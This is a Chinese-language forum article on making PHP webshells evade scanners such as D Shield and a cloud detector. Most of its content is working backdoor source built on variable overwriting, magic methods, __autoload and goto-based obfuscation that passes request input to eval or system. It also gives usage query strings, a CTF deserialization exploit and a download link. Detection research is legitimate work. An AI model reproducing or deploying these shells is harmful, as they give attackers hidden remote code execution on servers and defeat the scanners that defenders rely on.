0x00 前置知识
=========

这里主要分析php的webshell，asp与jsp以后再做分析。

1.php的哪些漏洞可以在webshell上面做文章？
---------------------------

反序列化，变量覆盖，代码执行，文件包含等等，当然也有可能存在其他的，这里就不深究了，感兴趣的师傅可以去研究一下。

2.反序列化在webshell中的利用
-------------------

这里我之前对php的16个魔法函数进行了简单的研究，发现16个函数，均可以用到webshell中，只要稍作改变就可以绕过很多waf，当前并不是所有的都能绕过，之前在一篇文章的评论中看到一位师傅的对啊某云的shell检测做了简单的分析：

> 北辰师傅的方式确实很HACK，用写文件的方式绕过污点追踪，类似的思路之前赏金活动中也有白帽子提交，目前还在处理中。在这里也跟大家分享一下检测的思路：冰蝎哥斯拉类样本主要有两个特征，加载自定义类跟类的实例化，污点只要经过这两点路径就会检测。这个样本里写文件到classes目录下+类实例化这两个方式是分离的，会导致污点的丢失。对于WebShell检测引擎来说，需要进行一定程度的模拟跟关联才能判定。除了这种分离文件的思路以外，jsp单文件利用这块其实还有很多trick，后续会出一些分析文章，也欢迎大家一起讨论

这里很感谢师傅的分享。 那么这里的重点就在“加载自定义类跟类的实例化，污点只要经过这两点路径就会检测”，这句话，所有我们在面对某云时，就要尽量避免上述操作，也就是说反序列化可能不太好用了。

这里简单用反序列化写个webshell的demo

```php
<?php  

class A{  
    function say(){  
        echo "xxxx";  
    }  
​  
    public static function __callStatic($func,$arr){  
        $c=array_shift($arr);  
        eval($func.$c);  
​  
    }  
​  
}  
$a=$_GET['a'];  
$c=$_GET['x'];  
$$a=$c;  
$d=substr($cbc,0,2);  
$e=substr($cbc,2);  
$app = new A();  
$app::$d($e);  
​  
?>
```

使用方法就是?x=phpinfo();&amp;a=cbc ![连接](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c84d4d3478f059480d137c1166a168a3bfc02775.png)

这个只是一个简单的免杀。过d盾，百度还是很简单的。 针对上面的反序列化免杀，简单的demo之前学习反序列化时，写过相关demo文档，有兴趣的师傅可以参考一下。 链接：<https://pan.baidu.com/s/1MP6UAwNDOndWQVmyGuGevw?pwd=suan> 提取码：suan

3. 变量覆盖如何使用？
------------

简单的一个demo说明一切:

```php
<?php  
$a=$_GET['x'];  
$b=$_GET['y'];  
$$a=$b;  
eval($xss);  
?>  

<!-- ?x=xss&y=phpinfo(); -->
```

这就是变量覆盖，上面那个反序列化的webshell的demo就配合了变量覆盖漏洞，到达了免杀。

0x02 实际测试
=========

经过上面的了解，想必师傅们觉得有点乏味了，那么只能说后面有惊喜了，感兴趣的师傅可以直接看后面。

1.很简单的免杀，针对某盾奇效
---------------

首先，我们看一段代码：

```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
class A{  
    private $b='aa';  
    public $c='xx';  
    public function __get($c){  
        eval($c);  
    }  
​  
}  
if (md5($_GET['m'])==='62888be80bab8996808b3ea1a07954fa'){  
    $app = new A();  
    $app->$_POST['x'];    
}else{  
    print("no!no!no!");  
}  
?>
```

这是一个简单的shell，d盾可以检测出来： ![d盾检测](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cdd3bb9f952c3c9700b32d53161a4ce2364a1d2d.png)

但是重点来了，咋们只要简单的加一行很简单的代码:

```php
$m=$c;
```

完整的：

```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
class A{  
    private $b='aa';  
    public $c='xx';  
    public function __get($c){  
        $m=$c;  
        eval($m);  
    }  
​  
}  
if (md5($_GET['m'])==='62888be80bab8996808b3ea1a07954fa'){  
    $app = new A();  
    $app->$_POST['x'];    
}else{  
    print("no!no!no!");  
}  
?>
```

![image-20220618000814863](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-87cba9377b3763424a6c855e470b80704ae8a7b3.png) d 某盾直接过了？？？很离谱对吧，但是事实就是这样，如果说d盾对变量不敏感，那是不可能的，对冰蝎哥斯拉等等的webshell魔改，d盾都会追踪到变量，所以这怎么说呢？ 可能是对某些特定的webshell，d盾会有较强的变量追踪吧，或者说d盾本身就对变量不敏感？这里还是个未知数，但是这个方法对付d盾还是很好的。

2.ctf的实例绕过
----------

这道题是ctf的反序列化的257关

```php
<?  
class ctfShowUser{  
    private $username='xxxxxx';  
    private $password='xxxxxx';  
    private $isVip=false;  
    private $class = 'info';  
​  
    public function __construct(){  
        $this->class=new info();  
    }  
    public function login($u,$p){  
        return $this->username===$u&&$this->password===$p;  
    }  
    public function __destruct(){  
        $this->class->getInfo();  
    }  
}  
class info{  
    private $user='xxxxxx';  
    public function getInfo(){  
        return $this->user;  
    }  
}  
class backDoor{  
    private $code;  
    public function getInfo(){  
        eval($this->code);  
    }  
}  
$username=$_GET['username'];  
$password=$_GET['password'];  
​  
if(isset($username) && isset($password)){  
    $user = unserialize($_COOKIE['user']);  
    $user->login($username,$password);  
}
```

首先这道题可能是可以执行系统命令的，那么也就是说我们可以执行系统命令，也可以当做webshell？

这次我们使用牧云做测试： ![image-20220618001849405](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-58db0dc868e682bea1e432d74be856c230f74a1e.png) 这样就过了.....很简单对吧，那么这道题的exp是：

```php
<?php  
class ctfShowUser{  
    private $username='1';  
    private $password='2';  
    private $isVip=false;  
    private $class;  

    public function __construct(){  
        $this->class=new backDoor();  
    }  
}  
class backDoor{  
    private $code="phpinfo;";  
}  
​  
$c=new ctfShowUser();  
echo urlencode(serialize($c));
```

反序列化输出，使用cookie传输就可以执行命令了，且url需要传参 /?username=1&amp;password=2

但是啊，这种如果是使用webshell客户端连接的话，就需要固定反序列化后的这段代码，并且使用GET或者POST方法将执行的命令在放到反序列化数据里，而且还需要改长度，这里不做演示，师傅们可以试试，理论上是可行的。

那么有没有简单的方法呢，答案是肯定的： demo:

```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
/**   
 * 文件autoload_demo.php   
 */   
​  
class A{  
    public $a;  
    public function __construct($a){  
        $c=$a;  
        if (strlen($a)>2){  
            $this->a = $c;  
            eval($this->a);  
            print('xxx');  
        }else{  
            print("NONONO");  
        }  
    }  
}  
​  
function  __autoload($className) {    
    $b=$_GET['a'];  
    new A($b);  
    print($className);  
    print('xx');  
    $filePath = “cs.txt”;   
    if (is_readable($filePath)) {    
        require($filePath);    
    }    
}    
​  
​  
if (1) {    
    $a = new abc();  
​  
} else if (0) {    
    $a = newA();    
    $b = new B();    
    // … 业务逻辑    
}  
​  
?>
```

测试可以过吗? ![image-20220618002957671](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5f2bb00248c6d8b1ed358fd09d679d772ba5354c.png) ok,一样bypass，这个使用就简单了，直接?a=phpinfo();就可以了，连接shell管理器的话，直接改成post就行了。

重点来了，goto的使用
------------

goto函数，官方介绍：

> goto 操作符可以用来跳转到程序中的另一位置。该目标位置可以用 区分大小写 的目标名称加上冒号来标记，而跳转指令是 goto 之后接上目标位置的标记。PHP 中的 goto 有一定限制，目标位置只能位于同一个文件和作用域，也就是说无法跳出一个函数或类方法，也无法跳入到另一个函数。也无法跳入到任何循环或者 switch 结构中。可以跳出循环或者 switch，通常的用法是用 goto 代替多层的 break。

简单使用官方的demo：

```php
<?php  
goto a;  
echo 'Foo';  

a:  
echo 'Bar';  
?>
```

输出：Bar

详细链接:<https://www.php.net/manual/zh/control-structures.goto.php>

简单来说就是程序执行的跳转，指哪跳哪，就是这么霸道。 最开始发现这个函数的时候是在使用网上的加密php代码中看到的，所以就了解到了这个函数，于是对他展开了bypass研究。 这是我写的的一个webshell:

```php
  
<?php  
header("Content-Type:text/html;charset=gbk");  
test4:  
error_reporting(0);  
goto test1;  
test2:  
if ($m == NULL){      
    print('NO');  
}else{      
    $m($l);      
    $o();  
}goto test3;  
test1:  
$l=$_GET['x'];  
$l=base64_decode($l);  
goto test2;  
test3:  
$m=$_GET['m'];  
$o=$_GET['o'];  
goto test4;  
?>  

```

首先检测免杀性:某云 ![image-20220618004321401](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ae67344112db1d62ec732e2433f1dc7f8c397cd1.png) 直接过了。 使用方法:

?x=aXBjb25maWc=&amp;m=system&amp;o=exit

其中x的参数是要执行的代码的base64编码 ![image-20220618004649148](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8c281f255fec75d02e07135d44668b222212c7ec.png)

代码解析: 这个其实很简单，就是使用goto反复横跳，使其成为一个循环，从循环中获取数据并执行代码，注意！！！！必须要后面接参数，否则就要拒绝服务了........

进一步优化，这个shell只能执行系统命令啊，可我想要webshell管理器连接啊，于是进一步优化了:

```php
  
<?php  
header("Content-Type:text/html;charset=utf-8");  
test4:  
 error_reporting(0);  
goto test1;  
test2:  
if ($l == NULL){      
    print('NO');  
}else{      
    print('OK');  
    eval($l);      
    $o();  
}  
goto test3;  
test1:  
$l='x';  
$l=$$l;  
print($l."ll");  
goto test2;  
test3:  
$m=$_GET['m'];  
$x=$_POST['y'];  
$o=$_GET['o'];  
goto test4;  
?>  
  
```

![image-20220618005047360](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-244627791614cc0f2c05cab53ea9363a5db44d1a.png) 过了，那么这个是这么做的?很简单，就是前面提到的变量覆盖，致使无法追踪变量，打组合拳。 使用: ![image-20220618005450304](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1e38255940aaf5d34fea76fd69a5c15f4b14b133.png)

0x03 总结
=======

首先我们得知道waf的工作机制，以及相对应的语言的写法，如果一种方法绕不过去，我们是不是可以打组合拳？或者是寻找其他的函数，尝试？ 对于有的waf，他们很强，我感觉甚至可以做代码审计了，但是相对了，为什么很多代码审计都是人在做？工具复辅助呢？很明显，工具并不是万能的，同样，waf也绝对不是100%拦截的，如果真达到100%拦截，那么正常代码还怎么运行？ 欢迎师傅们斧正，感谢。